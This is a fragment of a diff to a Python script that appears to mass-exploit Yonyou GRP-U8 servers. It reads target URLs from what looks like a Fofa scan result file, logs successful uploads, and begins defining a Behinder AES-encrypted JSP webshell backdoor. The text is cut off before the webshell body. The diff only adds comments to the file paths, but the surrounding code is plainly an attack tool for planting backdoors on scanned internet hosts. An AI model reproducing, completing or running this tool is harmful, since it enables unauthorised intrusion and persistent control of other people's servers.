@@ -18,8 +18,8 @@ alive_urls = []
 url_lock = Lock()
 
 # 目標檔案（可自行修改）
-url_file_path = 'C:\\Users\\Joker\\Desktop\\giwawatool\\X-Fofa\\result.txt'
-success_upload_file = 'C:\\Users\\Joker\\Desktop\\PoC\\用友GRP-U8\\result-success_upload.txt'
+url_file_path = 'C:\\Users\\Joker\\Desktop\\giwawatool\\X-Fofa\\result.txt' ### 修改
+success_upload_file = 'C:\\Users\\Joker\\Desktop\\PoC\\用友GRP-U8\\result-success_upload.txt' ### 修改
 
 # WebShell JSP 內容（Behinder AES 加密後門）
 webshell_content = '''Hello Administrator!
